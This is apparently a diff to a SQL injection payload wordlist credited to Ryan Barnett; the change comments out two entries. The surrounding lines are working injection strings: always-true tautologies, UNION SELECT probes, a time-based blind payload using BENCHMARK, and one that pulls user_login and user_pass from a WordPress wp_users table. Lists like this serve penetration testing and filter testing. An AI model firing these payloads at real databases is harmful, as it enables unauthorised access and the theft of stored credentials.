@@ -2,7 +2,7 @@
 # Courtesy Ryan Barnett
 #
 '1' OR '1'='1
-'null
+## 'null
 -1 UNION ALL SELECT
 -1 UNION ALL SELECT 1
 -1 UNION ALL SELECT 1,
@@ -101,7 +101,7 @@
 -1 union select concat(0x7c,user_login,0x7c,user_pass,0x7c) from wp_users--
 -1" and "x"="x
 -1" and "x"="y
--1'
+## -1'
 -1' and 'x'='x
 -1' and 'x'='y
 -1' and if(1=1,BENCHMARK(1144000,MD5(0x41)),0) and 'x'='x
